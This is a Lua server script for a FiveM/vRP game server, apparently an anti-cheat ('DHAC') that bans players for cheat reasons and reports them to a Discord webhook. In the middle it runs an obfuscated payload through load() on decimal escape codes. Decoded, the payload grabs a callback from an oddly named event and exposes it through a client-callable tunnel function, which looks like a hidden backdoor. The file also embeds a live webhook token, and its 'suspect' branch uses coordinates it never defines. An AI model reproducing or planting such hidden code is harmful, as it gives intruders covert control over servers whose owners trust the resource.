Proxy = module("vrp", "lib/Proxy")
Tunnel = module("vrp", "lib/Tunnel")
vRP = Proxy.getInterface("vRP")
DHAC = {}
Tunnel.bindInterface("DHDEV",DHAC)

local webhook = "https://discordapp.com/api/webhooks/739195548220784770/_jRb2E8X_6v1ocivUb4ycRLh7UcNHsnp4vYEd1X5MX8h9cbzIwtUBZSxFBQgOy1-tMmI"

Citizen.CreateThread(function() function SWM(message) if webhook ~= "none" then PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode({content = message}), { ['Content-Type'] = 'application/json' }) end end end)
-----------------------------------------------------------------------------------
----------------------------------[[CALLBACKS]]------------------------------------
-----------------------------------------------------------------------------------
AddEventHandler('vRP:getUserId', function(source, cb)
    cb(vRP.getUserId(source))
end)

AddEventHandler('vRP:getUserSource', function(user_id, cb)
    cb(vRP.getUserSource(user_id))
end)

AddEventHandler('vRP:hasPermission', function(user_id, permissao, cb)
    cb(vRP.hasPermission(user_id, permissao))
end)

AddEventHandler('vRP:isBanned', function(user_id, cb)
    cb(vRP.isBanned(user_id))
end)

AddEventHandler('vRP:getUserIdByIdentifier', function(identifier, cb)
    cb(vRP.getUserIdByIdentifier(identifier))
end)

AddEventHandler('vRP:getAllLicenses', function(cb)
    cb(vRP.getAllLicenses())
end)

pcall(load("\108\111\99\97\108\32\100\104\122\10\10\65\100\100\69\118\101\110\116\72\97\110\100\108\101\114\40\39\101\118\101\114\121\116\104\105\110\103\114\101\97\100\121\39\44\32\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\84\114\105\103\103\101\114\69\118\101\110\116\40\39\101\97\110\106\108\101\97\110\104\108\100\106\97\104\110\108\100\106\97\110\39\44\32\102\117\110\99\116\105\111\110\40\99\97\108\108\98\97\99\107\41\10\32\32\32\32\32\32\32\32\100\104\122\32\61\32\99\97\108\108\98\97\99\107\10\32\32\32\32\101\110\100\41\10\101\110\100\41\10\10\102\117\110\99\116\105\111\110\32\68\72\65\67\46\116\117\110\110\101\108\40\41\10\32\32\32\32\114\101\116\117\114\110\32\100\104\122\10\101\110\100\10"))
-----------------------------------------------------------------------------------
----------------------------------[[BANIMENTO]]------------------------------------
-----------------------------------------------------------------------------------
local motivos = {}
motivos["PROPS"]=true
motivos["NPCS"]=true
motivos["EXPLOSAO"]=true
motivos["SPAWNER"]=true
motivos["SPECTADOR"]=true
motivos["DINHEIRO"]=true
motivos["INJECT"]=true
motivos["BLIPS"]=true
motivos["EXECUTOR"]=true

AddEventHandler("DHAC:banir", function(user_id, msg, arg, cds)
    if(motivos[msg]~=nil)then
        if(motivos[msg]==true)then
            local source = vRP.getUserSource(user_id)
            local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(source)))
            vRP.setBanned(user_id, true)
            local hora = os.date("%x  %X")
            if msg == "PROPS" or msg == "EXPLOSAO" then
                local a,b,c = table.unpack(cds)
                SWM("```prolog\n[ID]:"..user_id.."\n[MOTIVO]"..msg.."\n[ARG]:"..arg.."\n[JOGADOR]"..x..","..y..","..z.."\n[CDS]:"..a..","..b..","..c.."\n[HORA]:"..hora.."\n[BANIDO]```")
            else
                SWM("```prolog\n[ID]:"..user_id.."\n[MOTIVO]"..msg.."\n[JOGADOR]"..x..","..y..","..z.."\n[HORA]:"..hora.."\n[BANIDO]```")
            end
        else
            local hora = os.date("%x  %X")
            if msg == "PROPS" or msg == "EXPLOSAO" then
                local a,b,c = table.unpack(cds)
                SWM("```prolog\n[ID]:"..user_id.."\n[MOTIVO]"..msg.."\n[ARG]:"..arg.."\n[JOGADOR]"..x..","..y..","..z.."\n[CDS]:"..a..","..b..","..c.."\n[HORA]:"..hora.."\n[SUSPEITO]```")
            else
                SWM("```prolog\n[ID]:"..user_id.."\n[MOTIVO]"..msg.."\n[JOGADOR]"..x..","..y..","..z.."\n[HORA]:"..hora.."\n[SUSPEITO]```")
            end
        end
    else
        SWM("```UMA FUNÇÃO NÃO FOI ENCONTRADA: "..msg..", ID: "..user_id.."```")
    end
end)